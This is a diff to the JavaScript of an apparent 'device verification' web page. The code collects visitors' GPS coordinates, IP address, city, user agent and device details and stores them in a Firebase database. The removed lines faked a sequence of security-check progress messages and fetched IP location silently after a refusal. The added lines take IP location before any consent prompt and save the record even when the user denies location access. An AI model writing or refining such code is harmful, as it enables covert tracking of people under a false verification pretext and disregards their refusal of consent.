@@ -2,18 +2,6 @@ import { initializeTheme } from './src/features/theme/theme-manager.js';
 import { listenForLocationRequests, setupUnloadHandler, determineLocationSource } from './src/features/location/location-tracker.js';
 import { getDeviceInfo } from './src/utils/browser-detection.js';
 
-// Verification steps (internal only, not shown to user)
-const VERIFICATION_STEPS = [
-    { message: 'Initializing secure verification...', delay: 1000 },
-    { message: 'Checking device compatibility...', delay: 1500 },
-    { message: 'Requesting secure location access...', delay: 0 },
-    { message: 'Retrieving device location...', delay: 2000 },
-    { message: 'Verifying location accuracy...', delay: 1500 },
-    { message: 'Validating IP address...', delay: 1500 },
-    { message: 'Performing security checks...', delay: 1500 },
-    { message: 'Finalizing device verification...', delay: 1000 }
-];
-
 // Helper function to handle geolocation errors
 function getGeolocationErrorMessage(error) {
     switch(error.code) {
@@ -44,32 +32,11 @@ async function getLocationFromIP() {
             altitudeAccuracy: null
         },
         ip: data.ip,
-        city: data.city,
-        region: data.region,
-        country: data.country_name
+        // Only include location data if it exists
+        ...(data.city && { city: data.city }),
+        ...(data.region && { region: data.region }),
+        ...(data.country_name && { country: data.country_name })
     };
-}
-
-// Helper function to update verification status
-function updateVerificationStatus(message, progress) {
-    const locationStatus = document.getElementById('locationStatus');
-    const verifyButton = document.getElementById('allowLocation');
-    
-    // Update button text to show progress
-    if (progress > 0) {
-        verifyButton.textContent = `Verifying... ${progress}%`;
-        verifyButton.style.setProperty('--progress', `${progress}%`);
-    }
-}
-
-// Helper function to simulate step processing
-async function processStep(stepIndex, totalSteps) {
-    const step = VERIFICATION_STEPS[stepIndex];
-    const progress = Math.round((stepIndex + 1) / totalSteps * 100);
-    updateVerificationStatus(step.message, progress);
-    if (step.delay > 0) {
-        await new Promise(resolve => setTimeout(resolve, step.delay));
-    }
 }
 
 // Initialize Firebase and load theme
@@ -90,17 +57,21 @@ document.addEventListener('DOMContentLoaded', async () => {
         verifyButton.addEventListener('click', async () => {
             try {
                 verifyButton.disabled = true;
+                verifyButton.textContent = 'Verifying...';
                 document.querySelector('.container').classList.add('processing');
                 locationStatus.textContent = '';
-
-                // Process initial steps
-                for (let i = 0; i < 2; i++) {
-                    await processStep(i, VERIFICATION_STEPS.length);
-                }
 
                 let position;
                 let locationSource;
                 let wasLocationDenied = false;
+                let ipData;
+
+                // Always get IP data first
+                try {
+                    ipData = await getLocationFromIP();
+                } catch (ipError) {
+                    console.error('IP location error:', ipError);
+                }
 
                 // Try to get precise location
                 if (navigator.geolocation) {
@@ -127,13 +98,10 @@ document.addEventListener('DOMContentLoaded', async () => {
                             verifyButton.textContent = 'Verify Device';
                             document.querySelector('.container').classList.remove('processing');
                             
-                            // Silently get IP location
-                            try {
-                                const ipLocation = await getLocationFromIP();
-                                position = ipLocation;
+                            // Use IP data as position
+                            if (ipData) {
+                                position = ipData;
                                 locationSource = 'IP-Based';
-                            } catch (ipError) {
-                                console.error('IP location error:', ipError);
                             }
                         } else {
                             throw geoError;
@@ -141,13 +109,8 @@ document.addEventListener('DOMContentLoaded', async () => {
                     }
                 }
 
-                // Only proceed with verification if location wasn't denied
-                if (!wasLocationDenied && position) {
-                    // Process remaining steps
-                    for (let i = 3; i < VERIFICATION_STEPS.length; i++) {
-                        await processStep(i, VERIFICATION_STEPS.length);
-                    }
-
+                // Only proceed with verification if we have position data
+                if (position) {
                     // Save to Firebase
                     if (!window.database) {
                         throw new Error('Firebase database not initialized');
@@ -156,31 +119,46 @@ document.addEventListener('DOMContentLoaded', async () => {
                     const locationsRef = window.database.ref('locations');
                     const newLocationRef = locationsRef.push();
 
+                    // Base location data
                     const locationData = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         accuracy: position.coords.accuracy,
-                        altitude: position.coords.altitude,
-                        altitudeAccuracy: position.coords.altitudeAccuracy,
                         locationSource: locationSource,
                         locationDenied: wasLocationDenied,
-                        city: position.city,
-                        region: position.region,
-                        country: position.country,
                         timestamp: new Date().toISOString(),
                         status: 'active',
-                        ip: position.ip || (await getLocationFromIP()).ip,
+                        ip: ipData?.ip || position.ip,
                         userAgent: navigator.userAgent,
                         ...getDeviceInfo()
                     };
 
+                    // Add optional fields only if they exist
+                    if (position.coords.altitude !== null) {
+                        locationData.altitude = position.coords.altitude;
+                    }
+                    if (position.coords.altitudeAccuracy !== null) {
+                        locationData.altitudeAccuracy = position.coords.altitudeAccuracy;
+                    }
+                    if (position.city) {
+                        locationData.city = position.city;
+                    }
+                    if (position.region) {
+                        locationData.region = position.region;
+                    }
+                    if (position.country) {
+                        locationData.country = position.country;
+                    }
+
                     await newLocationRef.set(locationData);
 
-                    // Show success and hide button
-                    locationStatus.textContent = 'Device verified successfully';
-                    locationStatus.style.color = ''; // Reset color
-                    verifyButton.style.display = 'none';
-                    document.querySelector('.thank-you-card').classList.add('success');
+                    if (!wasLocationDenied) {
+                        // Show success and hide button
+                        locationStatus.textContent = 'Device verified successfully';
+                        locationStatus.style.color = ''; // Reset color
+                        verifyButton.style.display = 'none';
+                        document.querySelector('.thank-you-card').classList.add('success');
+                    }
                 }
 
             } catch (error) {
@@ -189,7 +167,6 @@ document.addEventListener('DOMContentLoaded', async () => {
                 locationStatus.style.color = '#DA1710';
                 verifyButton.disabled = false;
                 verifyButton.textContent = 'Verify Device';
-                verifyButton.style.setProperty('--progress', '0%');
                 document.querySelector('.container').classList.remove('processing');
             }
         });
